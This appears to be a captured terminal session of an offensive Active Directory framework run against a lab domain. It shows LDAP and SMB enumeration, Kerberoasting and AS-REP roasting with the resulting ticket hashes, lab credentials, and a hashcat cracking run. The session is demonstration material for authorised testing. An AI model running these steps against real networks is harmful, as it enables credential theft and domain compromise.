@@ -1,0 +1,573 @@
+
+  ╔══════════════════════════════════════════════════════╗
+  ║                    SESSION SETUP                     ║
+  ╠══════════════════════════════════════════════════════╣
+  ║    Configure target — press Enter to skip a field    ║
+  ╚══════════════════════════════════════════════════════╝
+
+  [?] DC IP Address                  : 
+  [1/3] Querying LDAP rootDSE (fast)...
+  [+] LDAP rootDSE successful
+  [2/3] Domain found — skipping nxc fallback
+  [3/3] Port check skipped (run [2] Network Discovery when needed)
+  [+] Discovered  domain=hackerblueprint.local  fqdn=DC01.hackerblueprint.local
+  [?] Domain (e.g. hackerblueprint.local) [hackerblueprint.local]:   [?] DC FQDN (e.g. DC01.hackerblueprint.local) [DC01.hackerblueprint.local]:   [?] Username                       :   [?] Password (blank to use hash)   :   [?] NTLM Hash (blank if using password) :   [?] Attacker / Listener IP         :   [?] Network Interface (e.g. tun0, eth0) :   [?] Engagement Name                [hackerblueprint-lab]:   [+] Session configured!
+
+╭━━━┳━━━╮╱╱╭━━━┳━━━━┳━━━┳━━┳╮╭━┳━━━╮
+┃╭━╮┣╮╭╮┃╱╱┃╭━╮┃╭╮╭╮┃╭━╮┣┫┣┫┃┃╭┫╭━━╯
+┃┃╱┃┃┃┃┃┃╱╱┃╰━━╋╯┃┃╰┫╰━╯┃┃┃┃╰╯╯┃╰━━╮
+┃╰━╯┃┃┃┃┣━━╋━━╮┃╱┃┃╱┃╭╮╭╯┃┃┃╭╮┃┃╭━━╯
+┃╭━╮┣╯╰╯┣━━┫╰━╯┃╱┃┃╱┃┃┃╰┳┫┣┫┃┃╰┫╰━━╮
+╰╯╱╰┻━━━╯╱╱╰━━━╯╱╰╯╱╰╯╰━┻━━┻╯╰━┻━━━╯
+────────────────────────────────────────────────────────────────────────────────────
+  ACTIVE DIRECTORY STRIKE FRAMEWORK  |  v5.0 «AdStrike»  |  build 2026.04
+  25 menu entries  |  5 active phases  |  OSCP edition  |  reports  |  creator: tmrswrr
+  [!]  Authorised penetration testing and red-team engagements only
+────────────────────────────────────────────────────────────────────────────────────
+
+┌────────────────────────────────────────────────────────────────────────────────────────────────┐
+│  TARGET  jgarcia@hackerblueprint.local  ▶  192.168.189.10  │  AUTH   ✓ PASSWORD                │
+│  ENGAGE  hackerblueprint-lab                    │  STATS  0 cmd  |  0 findings  |  0u/0m owned │
+└────────────────────────────────────────────────────────────────────────────────────────────────┘
+
+  Quick path: [24] Session -> [25] Tool Checker -> [4] Enum -> [23] Report
+
+    PHASE 0  RECONNAISSANCE  ───────────────────────────────────────────────
+    [ 1]  Recon & OSINT                     DNS · WHOIS · email harvest · crt.sh
+    [ 2]  Network Discovery                 nmap · masscan · nbtscan · IPv6
+
+    PHASE 1  INITIAL ACCESS  ───────────────────────────────────────────────
+    [ 3]  Initial Access (No Creds)         NTLM capture · relay · ARP · DHCPv6 · RID
+
+    PHASE 2  ENUMERATION  ──────────────────────────────────────────────────
+    [ 4]  AD Enumeration                    LDAP · SMB · GPO · DNS · Trust · SPN · LAPS
+    [ 5]  PowerView Enumeration             Full PowerView cmdlet reference
+    [ 6]  BloodHound Helper                 SOAPHound · RustHound · ADExplorer · Neo4j
+    [ 7]  File & Share Hunter               Snaffler · SYSVOL · GPP · spider_plus
+    [ 8]  NetExec / NXC Suite               nxc smb · ldap · mssql · winrm · rdp
+    [ 9]  User Hunting                      SessionHunter · UserHunter · NetCease bypass
+    [10]  ADIDNS Abuse                      Wildcard DNS · WPAD · record inject · DNSAdmins
+
+    PHASE 3  PRIVILEGE ESCALATION  ─────────────────────────────────────────
+    [11]  Local Privilege Escalation        PowerUp · KrbRelayUp · Potatoes · JEA
+    [12]  Kerberos Attacks                  Golden · Silver · Diamond · Sapphire · Roast
+    [13]  Rubeus Toolkit                    TGT · TGS · Roast · PTT · S4U · monitor
+    [14]  ACL / ACE Abuse                   GenericAll · WriteDACL · ForceChange
+
+    PHASE 4  LATERAL MOVEMENT  ─────────────────────────────────────────────
+    [15]  Lateral Movement                  PSExec · WMI · DCOM · Evil-WinRM · WinRS
+    [16]  Coercion Attacks                  PrinterBug · PetitPotam · Relay→ShadowCreds
+    [17]  MSSQL Abuse                       xp_cmdshell · PowerUpSQL · linked server RCE
+    [18]  Password Attacks                  Spray · kerbrute · stuffing · relay
+
+    PHASE 5  CREDENTIAL ACCESS  ────────────────────────────────────────────
+    [19]  Credential Dumping                LSASS · SAM · NTDS · lsassy · nanodump
+    [20]  DCSync / DCShadow                 Full domain hash dump · rogue DC
+    [21]  Shadow Copies Abuse               VSS · NTDS.dit · SAM · SYSTEM extract
+
+    PHASE 6  PERSISTENCE  ──────────────────────────────────────────────────
+
+    PHASE 7  CLOUD / HYBRID  ───────────────────────────────────────────────
+
+    PHASE 8  ADVANCED OPERATIONS  ──────────────────────────────────────────
+
+    UTILITIES  ─────────────────────────────────────────────────────────────
+    [22]  Kerberos Manager                  TGT · PTT · S4U · ccache · krb5.conf
+    [23]  Generate Report                   HTML · Markdown · JSON pentest report
+    [24]  Session Manager                   Save · load · switch · clear sessions
+    [25]  Tool Checker                      Verify all 45+ required offensive tools
+    [ 0]  Exit                              Save session & quit
+
+
+  ┌─[AdStrike]─[v5.0]
+  └──▶ 
+  ╔════════════════════════════════════╗
+  ║    ACTIVE DIRECTORY ENUMERATION    ║
+  ╚════════════════════════════════════╝
+
+  [auto] DC IP                 : 192.168.189.10
+  [auto] Domain                : hackerblueprint.local
+  [auto] Username              : jgarcia
+  [auto] Password              : ***
+
+  [1]  LDAP Full Enumeration       (users/groups/computers)
+  [2]  SMB Shares & Sessions
+  [3]  GPO Enumeration
+  [4]  Domain Trust Enumeration
+  [5]  Password Policy
+  [6]  Kerberoastable Users (SPN)
+  [7]  AS-REP Roastable Users
+  [8]  AdminCount=1 Privileged Users
+  [9]  LAPS Enabled Computers
+  [10] Unconstrained Delegation
+  [11] Constrained Delegation
+  [12] DNS Enumeration
+  [13] OUs & Site Topology
+  [14] Exchange / RBAC Enumeration
+  [A]  Full Auto Enum (all above)
+  [0]  Back
+
+  ⠋ Enumerating LDAP...
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ ldapsearch -x -H ldaps://192.168.189.10:636 -D jgarcia@hackerblueprint.local -w Password1 -b DC=hackerblueprint,DC=lo...
+  └──────────────────────────────────────────────────
+  [+] Saved → /opt/AdStrike/output/enum/ldap_users.txt
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ ldapsearch -x -H ldaps://192.168.189.10:636 -D jgarcia@hackerblueprint.local -w Password1 -b DC=hackerblueprint,DC=lo...
+  └──────────────────────────────────────────────────
+  [+] Saved → /opt/AdStrike/output/enum/ldap_groups.txt
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ ldapsearch -x -H ldaps://192.168.189.10:636 -D jgarcia@hackerblueprint.local -w Password1 -b DC=hackerblueprint,DC=lo...
+  └──────────────────────────────────────────────────
+  [+] Saved → /opt/AdStrike/output/enum/ldap_computers.txt
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ nxc smb 192.168.189.10 -u jgarcia -p Password1 -d hackerblueprint.local --shares
+  └──────────────────────────────────────────────────
+SMB                      192.168.189.10  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hackerblueprint.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB                      192.168.189.10  445    DC01             [+] hackerblueprint.local\jgarcia:Password1 
+SMB                      192.168.189.10  445    DC01             [*] Enumerated shares
+SMB                      192.168.189.10  445    DC01             Share           Permissions     Remark
+SMB                      192.168.189.10  445    DC01             -----           -----------     ------
+SMB                      192.168.189.10  445    DC01             ADMIN$                          Remote Admin
+SMB                      192.168.189.10  445    DC01             C$                              Default share
+SMB                      192.168.189.10  445    DC01             IPC$            READ            Remote IPC
+SMB                      192.168.189.10  445    DC01             ITShare         READ,WRITE      
+SMB                      192.168.189.10  445    DC01             NETLOGON        READ            Logon server share 
+SMB                      192.168.189.10  445    DC01             Shared                          Shared Department Documents
+SMB                      192.168.189.10  445    DC01             SYSVOL          READ            Logon server share 
+SMB                      192.168.189.10  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hackerblueprint.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB                      192.168.189.10  445    DC01             [+] hackerblueprint.local\jgarcia:Password1 
+SMB                      192.168.189.10  445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
+SMB                      192.168.189.10  445    DC01             Administrator                 2026-04-27 13:12:44 0       Built-in account for administering the computer/domain 
+SMB                      192.168.189.10  445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
+SMB                      192.168.189.10  445    DC01             krbtgt                        2026-05-07 01:34:31 0       Key Distribution Center Service Account 
+SMB                      192.168.189.10  445    DC01             jgarcia                       2026-06-09 16:48:39 0       IT Support Technician 
+SMB                      192.168.189.10  445    DC01             svc_archive                   2026-06-09 16:48:39 0       Archive Service Account 
+SMB                      192.168.189.10  445    DC01             mharris                       2026-05-07 11:12:11 0       Finance Systems Analyst 
+SMB                      192.168.189.10  445    DC01             twright                       2026-06-09 16:48:39 0       IT Systems Administrator 
+SMB                      192.168.189.10  445    DC01             svc_deploy                    2026-06-09 16:48:39 0       Deployment Service Account 
+SMB                      192.168.189.10  445    DC01             rjohnson                      2026-05-25 03:15:19 0       HR Coordinator 
+SMB                      192.168.189.10  445    DC01             ksmith                        2026-05-10 11:24:15 0       Finance Analyst 
+SMB                      192.168.189.10  445    DC01             dlee                          2026-05-24 16:26:56 0       IT Helpdesk 
+SMB                      192.168.189.10  445    DC01             amartinez                     2026-05-10 11:24:15 0       IT Support 
+SMB                      192.168.189.10  445    DC01             bwilson                       2026-05-10 11:24:15 0       HR Manager 
+SMB                      192.168.189.10  445    DC01             [*] Enumerated 13 local users: HACKERBLUEPRINT
+SMB                      192.168.189.10  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hackerblueprint.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB                      192.168.189.10  445    DC01             [+] hackerblueprint.local\jgarcia:Password1 
+SMB                      192.168.189.10  445    DC01             [-] [REMOVED] Arg moved to the ldap protocol
+SMB                      192.168.189.10  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hackerblueprint.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB                      192.168.189.10  445    DC01             [+] hackerblueprint.local\jgarcia:Password1 
+SMB                      192.168.189.10  445    DC01             [-] [REMOVED] Use option --reg-sessions --qwinsta or --loggedon-users
+SMB                      192.168.189.10  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hackerblueprint.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB                      192.168.189.10  445    DC01             [+] hackerblueprint.local\jgarcia:Password1 
+SMB                      192.168.189.10  445    DC01             [-] Error enumerating logged on users: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+ldap_sasl_bind(SIMPLE): Can't contact LDAP server (-1)
+SMB                      192.168.189.10  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hackerblueprint.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB                      192.168.189.10  445    DC01             [+] hackerblueprint.local\jgarcia:Password1 
+SMB                      192.168.189.10  445    DC01             [+] Dumping password info for domain: HACKERBLUEPRINT
+SMB                      192.168.189.10  445    DC01             Minimum password length: 1
+SMB                      192.168.189.10  445    DC01             Password history length: None
+SMB                      192.168.189.10  445    DC01             Maximum password age: Not Set
+SMB                      192.168.189.10  445    DC01             
+SMB                      192.168.189.10  445    DC01             Password Complexity Flags: 000000
+SMB                      192.168.189.10  445    DC01                Domain Refuse Password Change: 0
+SMB                      192.168.189.10  445    DC01                Domain Password Store Cleartext: 0
+SMB                      192.168.189.10  445    DC01                Domain Password Lockout Admins: 0
+SMB                      192.168.189.10  445    DC01                Domain Password No Clear Change: 0
+SMB                      192.168.189.10  445    DC01                Domain Password No Anon Change: 0
+SMB                      192.168.189.10  445    DC01                Domain Password Complex: 0
+SMB                      192.168.189.10  445    DC01             
+SMB                      192.168.189.10  445    DC01             Minimum password age: 1 day 4 minutes 
+SMB                      192.168.189.10  445    DC01             Reset Account Lockout Counter: 30 minutes 
+SMB                      192.168.189.10  445    DC01             Locked Account Duration: 30 minutes 
+SMB                      192.168.189.10  445    DC01             Account Lockout Threshold: None
+SMB                      192.168.189.10  445    DC01             Forced Log off Time: Not Set
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ nxc smb 192.168.189.10 -u jgarcia -p Password1 -d hackerblueprint.local --users
+  └──────────────────────────────────────────────────
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ nxc smb 192.168.189.10 -u jgarcia -p Password1 -d hackerblueprint.local --groups
+  └──────────────────────────────────────────────────
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ nxc smb 192.168.189.10 -u jgarcia -p Password1 -d hackerblueprint.local --smb-sessions
+  └──────────────────────────────────────────────────
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ nxc smb 192.168.189.10 -u jgarcia -p Password1 -d hackerblueprint.local --loggedon-users
+  └──────────────────────────────────────────────────
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ ldapsearch -x -H ldaps://192.168.189.10:636 -D jgarcia@hackerblueprint.local -w Password1 -b DC=hackerblueprint,DC=lo...
+  └──────────────────────────────────────────────────
+  [+] Saved → /opt/AdStrike/output/enum/gpo_enum.txt
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ ldapsearch -x -H ldaps://192.168.189.10:636 -D jgarcia@hackerblueprint.local -w Password1 -b DC=hackerblueprint,DC=lo...
+  └──────────────────────────────────────────────────
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ nxc smb 192.168.189.10 -u jgarcia -p Password1 -d hackerblueprint.local --pass-pol
+  └──────────────────────────────────────────────────
+  ⠋ Finding Kerberoastable users...
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ /usr/bin/python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py hackerblueprint.local/jgarcia:'Password1' -d...
+  └──────────────────────────────────────────────────
+  ⠹ Finding Kerberoastable users...Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName                          Name         MemberOf                                         PasswordLastSet             LastLogon                   Delegation 
+--------------------------------------------  -----------  -----------------------------------------------  --------------------------  --------------------------  ----------
+HTTP/CLIENT-1                                 svc_archive                                                   2026-06-09 10:48:39.689973  2026-06-08 21:02:32.422180             
+HTTP/CLIENT-1.hackerblueprint.local           svc_archive                                                   2026-06-09 10:48:39.689973  2026-06-08 21:02:32.422180             
+MSSQLSvc/CLIENT-1.hackerblueprint.local:1433  svc_deploy   CN=CertEnroll,OU=IT,DC=hackerblueprint,DC=local  2026-06-09 10:48:39.612291  2026-06-09 08:42:17.838598             
+
+
+
+[-] CCache file is not found. Skipping...
+  ⠸ Finding Kerberoastable users...  [*] Crack: hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ nxc smb 192.168.189.10 -u jgarcia -p Password1 -d hackerblueprint.local --users | awk '/SMB/{print $5}' | grep -v '-'...
+  └──────────────────────────────────────────────────
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+$krb5asrep$23$jgarcia@HACKERBLUEPRINT.LOCAL:b7b8dd1b03cefe9c3d65321ec5c5f253$17498bd9111e3a754c6218db8559960eb0f4c54c2a1e64bc088ca71999cc62e4af6a7fee5c5132147f8b30ba2ef28bb9d181d0bc91fa56bdd7be06d62ad200b238be3c1e1980023c08c05dfbf94b6c95275b9265c17e7ba6998994ee46e8e7467d0abee2e98c84d03f6e73afe84428031c8371a5b40507ce02a68ffe1d84f6da622dcdb820b9178a0bce82dc4a9890f30e11a62673ef8cac9523d9cf52aae478f1378e513691c3141248750993b54184fd00d97d71d45644d06df1382af5cf8095e3b60aacc09150ddb71a7c0716956f0cba1602755e251a5e9422971999849567888b1c205cc4761729f0f3a2eacc265903c71ca193c3f508bb3a23ec28
+$krb5asrep$23$svc_archive@HACKERBLUEPRINT.LOCAL:6c16c50f7b298b11404074a6c6767bd9$5be120140e2421ba8bbe54197116f9740a9e58de2755b5ddb48993534f1db13f37457dbf09c412b59dc67b5910c32771ab987ea5e1038570da70eaa4bbd487403e74e0408173ff46e0c3469d106ab074d6d8f967667cb29ff598fd86ffe72cc20f3302894027bb45850d44f8eaf8ccc8ad2580306e85e65b567f59bf1a15e48fe9c4b9a6d17d10882ea78e7a9fe4ada36daf4dbc026d7d9d6a7046d73612dba716c72be2c2229970dce7842a20fac8489f33749b3878c33aaba3374d9415b8639451c69e8c466168fc09e2abff36764ddf7a62b9c4a7a908899f82aba2b5607192a95ae3f15bcd7c67868d9e43ede875190970f2ece1749c4e44174c1dfc
+[-] User mharris doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User twright doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User svc_deploy doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User rjohnson doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User ksmith doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User dlee doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User amartinez doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User bwilson doesn't have UF_DONT_REQUIRE_PREAUTH set
+ldap_sasl_bind(SIMPLE): Can't contact LDAP server (-1)
+ldap_sasl_bind(SIMPLE): Can't contact LDAP server (-1)
+ldap_sasl_bind(SIMPLE): Can't contact LDAP server (-1)
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+AccountName  AccountType  DelegationType  DelegationRightsTo  SPN Exists 
+-----------  -----------  --------------  ------------------  ----------
+DC01$        Computer     Unconstrained   N/A                 Yes        
+
+
+
+
+; <<>> DiG 9.20.22-1-Debian <<>> axfr @192.168.189.10 hackerblueprint.local
+; (1 server found)
+;; global options: +cmd
+; Transfer failed.
+Starting Nmap 7.93 ( https://nmap.org ) at 2026-06-09 11:01 CST
+Nmap scan report for hackerblueprint.local (192.168.189.10)
+Host is up (0.00065s latency).
+Not shown: 988 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+MAC Address: 00:0C:29:01:E1:CF (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 4.29 seconds
+ldap_sasl_bind(SIMPLE): Can't contact LDAP server (-1)
+ldap_sasl_bind(SIMPLE): Can't contact LDAP server (-1)
+SMB                      192.168.189.10  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hackerblueprint.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB                      192.168.189.10  445    DC01             [+] hackerblueprint.local\jgarcia:Password1 
+SPIDER_PLUS              192.168.189.10  445    DC01             [*] Started module spidering_plus with the following options:
+SPIDER_PLUS              192.168.189.10  445    DC01             [*]  DOWNLOAD_FLAG: False
+SPIDER_PLUS              192.168.189.10  445    DC01             [*]     STATS_FLAG: True
+SPIDER_PLUS              192.168.189.10  445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
+SPIDER_PLUS              192.168.189.10  445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
+SPIDER_PLUS              192.168.189.10  445    DC01             [*]  MAX_FILE_SIZE: 50 KB
+SPIDER_PLUS              192.168.189.10  445    DC01             [*]  OUTPUT_FOLDER: /home/b3t4m3/.nxc/modules/nxc_spider_plus
+SMB                      192.168.189.10  445    DC01             [*] Enumerated shares
+SMB                      192.168.189.10  445    DC01             Share           Permissions     Remark
+SMB                      192.168.189.10  445    DC01             -----           -----------     ------
+SMB                      192.168.189.10  445    DC01             ADMIN$                          Remote Admin
+SMB                      192.168.189.10  445    DC01             C$                              Default share
+SMB                      192.168.189.10  445    DC01             IPC$            READ            Remote IPC
+SMB                      192.168.189.10  445    DC01             ITShare         READ,WRITE      
+SMB                      192.168.189.10  445    DC01             NETLOGON        READ            Logon server share 
+SMB                      192.168.189.10  445    DC01             Shared                          Shared Department Documents
+SMB                      192.168.189.10  445    DC01             SYSVOL          READ            Logon server share 
+SPIDER_PLUS              192.168.189.10  445    DC01             [+] Saved share-file metadata to "/home/b3t4m3/.nxc/modules/nxc_spider_plus/192.168.189.10.json".
+SPIDER_PLUS              192.168.189.10  445    DC01             [*] SMB Shares:           7 (ADMIN$, C$, IPC$, ITShare, NETLOGON, Shared, SYSVOL)
+SPIDER_PLUS              192.168.189.10  445    DC01             [*] SMB Readable Shares:  4 (IPC$, ITShare, NETLOGON, SYSVOL)
+SPIDER_PLUS              192.168.189.10  445    DC01             [*] SMB Writable Shares:  1 (ITShare)
+SPIDER_PLUS              192.168.189.10  445    DC01             [*] SMB Filtered Shares:  1
+SPIDER_PLUS              192.168.189.10  445    DC01             [*] Total folders found:  23
+SPIDER_PLUS              192.168.189.10  445    DC01             [*] Total files found:    11
+SPIDER_PLUS              192.168.189.10  445    DC01             [*] File size average:    878.18 B
+SPIDER_PLUS              192.168.189.10  445    DC01             [*] File size min:        0 B
+SPIDER_PLUS              192.168.189.10  445    DC01             [*] File size max:        4.07 KB
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ /usr/bin/python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py hackerblueprint.local/ -dc-ip 192.168.189.10 ...
+  └──────────────────────────────────────────────────
+  [*] Crack: hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ ldapsearch -x -H ldaps://192.168.189.10:636 -D jgarcia@hackerblueprint.local -w Password1 -b DC=hackerblueprint,DC=lo...
+  └──────────────────────────────────────────────────
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ ldapsearch -x -H ldaps://192.168.189.10:636 -D jgarcia@hackerblueprint.local -w Password1 -b DC=hackerblueprint,DC=lo...
+  └──────────────────────────────────────────────────
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ ldapsearch -x -H ldaps://192.168.189.10:636 -D jgarcia@hackerblueprint.local -w Password1 -b DC=hackerblueprint,DC=lo...
+  └──────────────────────────────────────────────────
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ /usr/bin/python3 /usr/share/doc/python3-impacket/examples/findDelegation.py hackerblueprint.local/jgarcia:'Password1'...
+  └──────────────────────────────────────────────────
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ dig axfr @192.168.189.10 hackerblueprint.local
+  └──────────────────────────────────────────────────
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ nmap --script dns-srv-enum --script-args dns-srv-enum.domain=hackerblueprint.local 192.168.189.10
+  └──────────────────────────────────────────────────
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ ldapsearch -x -H ldaps://192.168.189.10:636 -D jgarcia@hackerblueprint.local -w Password1 -b DC=hackerblueprint,DC=lo...
+  └──────────────────────────────────────────────────
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ ldapsearch -x -H ldaps://192.168.189.10:636 -D jgarcia@hackerblueprint.local -w Password1 -b DC=hackerblueprint,DC=lo...
+  └──────────────────────────────────────────────────
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ nxc smb 192.168.189.10 -u jgarcia -p Password1 -d hackerblueprint.local -M spider_plus
+  └──────────────────────────────────────────────────
+
+  [*] Full Enum complete — launching Smart Analyst...
+
+  ╔═════════════════════════════════════════════════════╗
+  ║                    SMART ANALYST                    ║
+  ╠═════════════════════════════════════════════════════╣
+  ║    Parse collected data and build an attack plan    ║
+  ╚═════════════════════════════════════════════════════╝
+
+  ⠋ Analysing output files......
+  Data sources:  0 users    0 groups    0 computers    0 ADCS vulns    0 agent findings
+
+  ──────────────────────────────────────────────────────────────────────────
+    ATTACK PLAN  —  2 finding(s)
+  ──────────────────────────────────────────────────────────────────────────
+
+  [ 1]  [HIGH    ]  Kerberoast hashes found (2)
+         File: /tmp/kerberoast.txt
+         $ hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt --force
+
+  [ 2]  [HIGH    ]  AS-REP hashes found (2)
+         File: /tmp/asrep.txt
+         $ hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt --force
+
+  Auto-execute a step? (number / 'a' for all / Enter to skip)
+hashcat (v7.1.2) starting
+
+You have enabled --force to bypass dangerous warnings and errors!
+This can hide serious problems and should only be done when debugging.
+Do not report hashcat issues encountered when using --force.
+
+Initializing bridges. Please be patient...Initialized bridgesInitializing backend runtimes. Please be patient...Initialized backend runtimesInitializing backend devices. Please be patient...Initialized backend devicesOpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================================
+* Device #01: cpu-haswell-AMD Ryzen 7 5800X 8-Core Processor, 5002/10005 MB (2048 MB allocatable), 16MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Counting lines in /tmp/kerberoast.txt. Please be patient...Counted lines in /tmp/kerberoast.txtParsing Hashes: 1/2 (50.00%)...Parsed Hashes: 2/2 (100.00%)Sorting hashes. Please be patient...Sorted hashesRemoving duplicate hashes. Please be patient...Removed duplicate hashesSorting salts. Please be patient...Sorted saltsComparing hashes with potfile entries. Please be patient...Compared hashes with potfile entriesGenerating bitmap tables...Generated bitmap tablesHashes: 2 digests; 2 unique digests, 2 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Initializing bridge salts. Please be patient...Initialized bridge saltsInitializing device kernels and memory. Please be patient...Initializing backend runtime for device #1. Please be patient...Initialized backend runtime for device #1Host memory allocated for this attack: 516 MB (4056 MB free)
+
+Initialized device kernels and memoryStarting self-test. Please be patient...Finished self-testDictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+$krb5tgs$23$*svc_archive$HACKERBLUEPRINT.LOCAL$hackerblueprint.local/svc_archive*$4ed48d10417fd8a21f6c3562e4aa9e2b$2132ef4458efe8b684151d4585d9792df09ee6b80fa506345c609f3bd4d744c366c9f4c89fb9052fea8730977a9e92bedb7aab32a9e4e0c60029af679fe96df9bb17fb7b432d79f1630be14121ee9f8c7576eef7fd0b54ad8a110ab383d2db5fc7e63fec66b54b94c4ba7a2f33ee77ab50578177381fc530c81883e17e13ba601b47049d09a86329227b18d96e67cd4f205e01ea54db605f21d2c7bf2a50286b227a8bd86b43d29a3ff219b2fac8d366beecefd4a9a304e10cec905bdb29b8f89c75f03a0158efacaf7be1b6368712def2ed61fbdef499da7729e9daebb39f40597b0e36921f42878e46ee69a0acdebb00dca026c04e18945b55f2707523d20e8fc021f3a484e00dbd2996efed2b4f2f107c6cb37af7275efd6cfe4f8339c6d4ce1e983b3d1522f554fb0598b1e6932f13df5a648301a9f84282cb7b52bb7b859788536b22e7d0278ebd239d48394b8c2821a96827d02da086e3e57338953af343960826d3f9f20691fd566dc36a2384b47c2c9edbbb247a6c81ede808d100860165ae31752ae53e8a2691e13e082907f567e0857bff4a1dbaac6a5f42ffd1e21951f8a242d3b20ca2d9c9c5d7e500adab2bfe2d04b16914b77545eb0b307dd94e83c651751452743799642ac731c40457a66bf37508d32dbde08e42b7cb43fc6f74bb87ea6eb28a77154cd80ee743876c7d6eb896ea4eaac0deb20ecc33dfacafca403412c68353196172a4482a4aa5a70f37733489a83ab5b78c3713b3bb080b56581e4dc2dc0aa84b26227bc4e7116f52d698936e533bcd6135016fffe209cd964691ba9abf805c3ac8b83d9f635723ccaee5dd46555cef4dfa6247c4a85a00ffdb62675d2cfca92a7c957539cf1bb3df2806b32fc20b6ae4e7126525f9e111b15a1ccf4182df409eb3dd91dd80251bae56e18e73c183cfc5914a075b125bf4bdccd3458fdefa6d6f3e2f0357f78ac95d5fbc7261f79fce1d2606d9adf5618c52ad5cd71f8280523e752260ba6f1127017419faf6852d03a4fae83a66e75488092ec2b3a99300ee74ad577154159f48ec4e76359ba658b18954ca2c5205b8ad7ae373b1a73ebd614a5d87040996e813abc501ff0489fff60ed40e6f34b1283fe14744b20767b6c51ab448258720c82173fce7d96eb6d85161c859ce1bdcfd5d3966545ea1a61dc0262830841cc0f16f6eda96868e192b2df9ab8a026daa808c5451f98b721d9ee5b78c3474f88d712ec7dd1e495aa4b6d5f5948ea8e45a22425df05448a94559d6c727e02134d1a41f8d38cbc8b28ccd030cdcbd64084ee78e22afa326b92cc033e69be52d87888c